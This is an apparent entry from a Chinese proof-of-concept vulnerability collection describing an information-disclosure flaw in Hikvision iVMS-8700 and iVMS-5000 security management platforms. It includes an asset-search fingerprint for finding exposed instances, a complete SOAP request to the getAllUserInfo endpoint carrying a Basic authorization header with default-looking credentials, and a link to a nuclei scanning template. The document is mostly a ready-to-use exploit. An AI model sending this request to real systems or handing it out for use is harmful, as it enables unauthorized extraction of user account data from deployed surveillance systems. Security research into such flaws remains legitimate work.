---
fofa: "web.body="
source: "wy876 漏洞文库"
---

# 海康威视iVMS-8700综合安防管理平台 getAllUserInfo存在信息泄露漏洞

# 一、漏洞简介
  海康威视iVMS集中监控应用管理平台，是以安全防范业务应用为导向，以视频图像应用为基础手段，综合视频监控、联网报警、智能分析、运维管理等多种安全防范应用系统，构建的多业务应用综合管理平台。海康威视iVMS-8700综合安防管理平台 getAllUserInfo存在信息泄露漏洞

# 二、影响版本
+ 海康威视综合安防系统iVMS-5000
+ 海康威视综合安防系统 iVMS-8700

# 三、资产测绘
+ hunter：`web.body="/views/home/file/installPackage.rar"`


+ 登录页面：


# 四、漏洞复现
```plain
POST /services/IWsBaseService.IWsBaseServiceHttpSoap11Endpoint HTTP/1.1
Host: {hostname}
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Content-Length: 569
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Authorization: Basic YWRtaW46MTIzNDU2
Connection: close
Connection: close

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:impl="http://impl.ws.api.base.cms.hikvision.com" xmlns:xsd="http://ws.common.cms.hikvision.com/xsd">
<soapenv:Header/>
<soapenv:Body>
    <impl:getAllUserInfo>
        <impl:request>
            <!--type: int-->
            <xsd:pageNo>1</xsd:pageNo>
            <!--type: int-->
            <xsd:pageSize>1</xsd:pageSize>
        </impl:request>
        <!--type: long-->
        <impl:updTime></impl:updTime>
    </impl:getAllUserInfo>
</soapenv:Body>
</soapenv:Envelope>
```


nuclei脚本：

[海康威视-ivms-8700-信息泄露.yaml](https://www.yuque.com/attachments/yuque/0/2024/yaml/1622799/1709222237212-7f41ac18-a5a1-46d6-aa2e-960b2d07f2fd.yaml)


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/vlzpa0f6workvx4g>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
